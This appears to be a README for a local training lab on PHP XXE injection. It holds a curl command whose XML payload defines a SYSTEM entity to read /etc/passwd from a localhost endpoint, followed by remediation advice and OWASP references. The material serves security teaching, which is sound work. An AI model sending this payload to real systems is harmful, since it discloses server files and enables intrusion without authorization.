# PHP simplexml_load_string XML External Entity (XXE) Injection

## Overview

In PHP applications parsing XML with simplexml_load_string() or DOMDocument without disabling external entity resolution (LIBXML_NOENT), unauthenticated clients can define custom XML external entities using SYSTEM identifiers. This enables arbitrary local file disclosure (e.g. file:///etc/passwd), internal port scanning, and SSRF attacks.

- **Service Access**: `http://localhost:8180/`
- **Default Credentials**: `Unauthenticated XML POST`
- **Docker Shortcut**: `./lab start php-xxe-injection`
- **Container Name**: `cyberlab_02_php_xxe_injection`
- **RAM Footprint**: ~40M

---

## Exploitation Walkthrough

### 1. Send XXE Payload to Read /etc/passwd

```bash
curl -i -X POST 'http://localhost:8180/doLogin.php' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<user><username>&xxe;</username><password>admin</password></user>'
```

### 2. Verify File Leakage

```bash
# Response discloses system user records.
```

---

## Defensive Remediation & Hardening

1. **Disable entity loading in PHP before parsing**:
   Disable entity loading in PHP before parsing: libxml_disable_entity_loader(true).
2. Use modern PHP 8+ where entity loading is disabled by default.
3. Reject DTD declarations in user-submitted XML payloads.

---

## Video Walkthroughs & Technical References

- [Server-Side Request Forgery (SSRF) | Complete Guide](https://www.youtube.com/watch?v=ih5R_c16bKc)
- [OWASP XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [Vulhub PHP XXE Environment](https://vulhub.org/#/environments/php/xxe/)
